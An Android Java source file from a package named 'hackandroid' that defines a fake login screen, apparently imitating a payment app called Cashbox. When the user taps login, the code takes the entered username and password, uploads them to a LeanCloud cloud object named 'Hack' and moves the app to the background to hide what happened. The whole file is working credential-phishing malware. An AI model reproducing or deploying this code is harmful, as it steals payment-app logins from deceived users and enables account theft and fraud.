package com.iboxpay.hackandroid;

import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import com.avos.avoscloud.AVException;
import com.avos.avoscloud.AVObject;
import com.avos.avoscloud.SaveCallback;

public class FakeCashboxLoginActivity extends AppCompatActivity implements View.OnClickListener {
    private Button mLoginBtn;
    private EditText mUserNameEt;
    private EditText mPasswordEt;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_fake_cashbox_login);
        mLoginBtn = (Button) findViewById(R.id.btn_login_submit);
        mLoginBtn.setOnClickListener(this);
        mUserNameEt = (EditText) findViewById(R.id.edtTxt_login_userName);
        mPasswordEt = (EditText) findViewById(R.id.edtTxt_login_pwd);
    }

    @Override
    public void onClick(View v) {
        switch (v.getId()) {
            case R.id.btn_login_submit:
                AVObject product = new AVObject("Hack");
                product.put("useName", mUserNameEt.getText().toString());
                product.put("password", mPasswordEt.getText().toString());
                product.saveInBackground();
                moveTaskToBack(true);
                break;
            default:

        }
    }
}
